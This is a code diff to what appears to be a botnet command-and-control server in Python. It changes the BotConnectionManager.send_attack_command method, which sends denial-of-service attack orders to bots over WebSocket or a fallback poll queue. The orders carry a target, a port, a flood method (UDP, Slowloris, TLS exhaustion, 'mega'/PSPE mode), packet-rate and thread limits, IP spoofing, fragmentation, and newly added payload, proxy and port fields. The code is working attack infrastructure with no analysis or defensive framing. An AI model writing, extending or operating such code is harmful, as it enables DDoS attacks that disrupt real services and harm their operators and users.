@@ -144,13 +144,13 @@ class BotConnectionManager:
             return False
 
     async def send_attack_command(self, bot_id: str, task: dict):
-        method = (task.get("method") or "UDP").upper()
+        method = (task.get("method") or "PSPE").upper()
         flags = {
             "slowloris": 1 if method == "SLOWLORIS" or task.get("slowloris") else 0,
-            "tls_exhaust": 1 if method == "TLS_EXHAUST" or task.get("tls_exhaust") else 0,
-            "mega_mode": 1 if method == "MEGA" or task.get("mega_mode") else 0,
+            "tls_exhaust": 1 if method in ("TLS", "TLS_EXHAUST") or task.get("tls_exhaust") else 0,
+            "mega_mode": 1 if method in ("PSPE", "MEGA") or task.get("mega_mode") else 0,
         }
-        ok = await self.send_json(bot_id, {
+        frame = {
             "type": "attack",
             "task_id": task["id"],
             "target": task["target"],
@@ -161,24 +161,16 @@ class BotConnectionManager:
             "max_threads": task.get("threads", 100),
             "spoof_mode": task.get("spoof_mode", 0),
             "fragmentation": task.get("fragmentation", 0),
+            "payload": task.get("payload") or "",
+            "proxies": task.get("proxies") or "",
+            "open_ports": task.get("open_ports") or str(task.get("port") or ""),
             **flags,
-        })
+        }
+        ok = await self.send_json(bot_id, frame)
         if not ok:
             # Bot not on WS — queue for HTTP/2 poll mode
-            self.queue_command(bot_id, {
-                "type": "attack",
-                "task_id": task["id"],
-                "target": task["target"],
-                "port": task["port"],
-                "method": method,
-                "duration": task["duration"],
-                "max_pps": task.get("pps", 100000),
-                "max_threads": task.get("threads", 100),
-                "spoof_mode": task.get("spoof_mode", 0),
-                "fragmentation": task.get("fragmentation", 0),
-                **flags,
-            })
-        print(f"[WS] attack cmd bot={bot_id} method={method} ok={ok}")
+            self.queue_command(bot_id, frame)
+        print(f"[WS] attack cmd bot={bot_id} method={method} ports={frame.get('open_ports','')[:80]} ok={ok}")
 
     async def send_stop_command(self, bot_id: str, task_id: str):
         await self.send_json(bot_id, {"type": "stop", "task_id": task_id})
